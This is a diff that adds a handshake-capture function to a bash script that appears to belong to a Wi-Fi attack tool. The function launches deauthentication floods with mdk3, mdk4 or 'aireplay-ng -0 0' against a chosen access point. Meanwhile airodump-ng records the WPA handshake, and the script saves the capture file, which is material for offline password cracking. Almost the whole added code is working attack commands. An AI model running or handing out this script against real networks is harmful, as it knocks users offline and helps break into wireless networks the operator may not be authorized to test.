@@ -1,5 +1,69 @@
 #!/bin/bash
 
+function handshake_capture {
+
+	clear
+
+	echo -e "$CGN"
+	echo "   _   _     _     _   _  ____   ____   _   _     _     _  __ _____                    "
+	echo "  | | | |   / \   | \ | ||  _ \ / ___| | | | |   / \   | |/ /| ____|                   "
+	echo "  | |_| |  / _ \  |  \| || | | |\___ \ | |_| |  / _ \  | ' / |  _|                     "
+	echo "  |  _  | / ___ \ | |\  || |_| | ___) ||  _  | / ___ \ | . \ | |___                    "
+	echo "  |_| |_|/_/   \_\|_| \_||____/ |____/ |_| |_|/_/   \_\|_|\_\|_____|                   "
+	echo "                                 ____     _     ____  _____  _   _  ____   _____       "
+	echo "                                / ___|   / \   |  _ \|_   _|| | | ||  _ \ | ____|  _   "
+	echo "                               | |      / _ \  | |_) | | |  | | | || |_) ||  _|   (_)  "
+	echo "                               | |___  / ___ \ |  __/  | |  | |_| ||  _ < | |___   _   "
+	echo "                                \____|/_/   \_\|_|     |_|   \___/ |_| \_\|_____| (_)  "
+	echo "                                                                                       "
+	echo -e "\n         $CAMRK PAY ATTENTION TO THE HANDSHAKE CAPTURE WINDOW ! "
+	echo -e " WE WILL ASK IF YOU GOT THE HANDSHAKE FILE AFTER THE WINDOW CLOSES "
+	echo
+	echo -e " $CGMRK Using '$AttackMode' For The Attack $CWE \n"
+
+	echo -n " Press [Enter] Key To Continue ... "
+	read -r continue
+
+	echo "${bssid}" > "${TmpDIR}bl.txt"
+
+	case $AttackMode in
+	  mdk3)
+			xterm +j -fg red -geometry "$XTermGeometry" -T "Mdk3 Attack" -e mdk3 "$Interface" d -b "${TmpDIR}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+			ProcessIdAttack=$!
+
+			xterm +j -geometry "$XTermGeometry" -T "Capturing HandShake" -e airodump-ng -c "${channel}" -d "${bssid}" -w "${TmpDIR}HandShake" "$Interface" > /dev/null 2>&1 &
+			ProcessIdCapture=$!
+
+			sleep $TimeAttack && kill $ProcessIdAttack
+			sleep $TimeCapture && kill $ProcessIdCapture
+	  ;;
+	  mdk4)
+			xterm +j -fg red -geometry "$XTermGeometry" -T "Mdk4 Attack" -e mdk4 "$Interface" d -b "${TmpDIR}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+			ProcessIdAttack=$!
+
+			xterm +j -geometry "$XTermGeometry" -T "Capturing HandShake" -e airodump-ng -c "${channel}" -d "${bssid}" -w "${TmpDIR}HandShake" "$Interface" > /dev/null 2>&1 &
+			ProcessIdCapture=$!
+
+			sleep $TimeAttack && kill $ProcessIdAttack
+			sleep $TimeCapture && kill $ProcessIdCapture
+	  ;;
+	  aireplay)
+			xterm +j -geometry "$XTermGeometry" -T "Capturing HandShake" -e airodump-ng -c "${channel}" -d "${bssid}" -w "${TmpDIR}HandShake" "$Interface" > /dev/null 2>&1 &
+			ProcessIdCapture=$!
+
+			sleep .5
+
+			xterm +j -fg red -geometry "$XTermGeometry" -T "Aireplay Attack" -e sudo aireplay-ng -0 0 -a ${bssid} $Interface > /dev/null 2>&1 &
+			ProcessIdAttack=$!
+
+			sleep $TimeAttack && kill $ProcessIdAttack
+			sleep $TimeCapture && kill $ProcessIdCapture
+	  ;;
+	esac
+
+	sudo cp "${TmpDIR}HandShake-01.cap" "${DefaultHandShakeSave}HandShake-${bssid}.cap"
+}
+
 #Manage target exploration and parse the output files
 function explore_for_networks {
 
